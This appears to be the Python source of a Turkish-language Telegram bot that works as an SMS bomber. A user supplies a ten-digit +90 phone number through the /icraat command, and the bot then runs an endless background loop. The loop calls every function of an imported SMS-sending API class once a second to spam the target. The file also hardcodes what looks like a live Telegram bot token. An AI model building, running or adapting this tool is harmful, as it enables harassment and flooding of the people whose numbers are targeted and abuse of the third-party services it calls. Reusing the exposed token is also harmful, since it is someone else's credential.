import asyncio
from telegram import Update
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, filters,
    ContextTypes, ConversationHandler
)
import time
from api import A  # Senin api.py dosyan

TOKEN = "8229355407:AAGZAX6Cko9XaaA3uTBwJoHQuIV1i2bdCKE"

TELEFON_NUMARASI_AL = 1

servisler_api = [
    getattr(A, func) for func in dir(A)
    if callable(getattr(A, func)) and not func.startswith("__")
]

def spam_sms(tel_no):
    send_a = A(tel_no)
    while True:
        for api_func in servisler_api:
            try:
                api_func(send_a)
                print(f"[+] API {api_func.__name__} çağrıldı.")
            except Exception as e:
                print(f"[-] Hata {api_func.__name__}: {e}")
            time.sleep(1)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Selam! /icraat ile spam başlatabilirsin, /api ile API listesini görebilirsin."
    )

async def api_liste(update: Update, context: ContextTypes.DEFAULT_TYPE):
    mesaj = "📋 Kullanılabilir API Fonksiyonları:\n\n"
    for i, api_func in enumerate(servisler_api, 1):
        mesaj += f"{i}. {api_func.__name__}\n"
    await update.message.reply_text(mesaj)

async def icraat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args

    if args:
        tel_no = args[0].strip()
        if not tel_no.isdigit() or len(tel_no) != 10:
            await update.message.reply_text("Geçersiz numara! Lütfen 10 haneli rakam gir.")
            return ConversationHandler.END

        await update.message.reply_text(f"+90{tel_no} için spam başlatılıyor...")

        loop = asyncio.get_running_loop()
        loop.run_in_executor(None, spam_sms, tel_no)

        await update.message.reply_text("Spam başladı! Bot arka planda çalışıyor.")
        return ConversationHandler.END

    await update.message.reply_text("Lütfen 10 haneli telefon numaranı yaz (ör: 5442558805):")
    return TELEFON_NUMARASI_AL

async def telefon_numarasi_al(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tel_no = update.message.text.strip()

    if not tel_no.isdigit() or len(tel_no) != 10:
        await update.message.reply_text("Geçersiz numara! Lütfen 10 haneli rakam gir.")
        return TELEFON_NUMARASI_AL

    await update.message.reply_text(f"+90{tel_no} için spam başlatılıyor...")

    loop = asyncio.get_running_loop()
    loop.run_in_executor(None, spam_sms, tel_no)

    await update.message.reply_text("Spam başladı! Bot arka planda çalışıyor.")
    return ConversationHandler.END

def main():
    app = ApplicationBuilder().token(TOKEN).build()

    print("Bot çalışıyor!")

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("api", api_liste))

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("icraat", icraat)],
        states={
            TELEFON_NUMARASI_AL: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, telefon_numarasi_al)
            ]
        },
        fallbacks=[]
    )
    app.add_handler(conv_handler)

    app.run_polling()

if __name__ == "__main__":
    main()
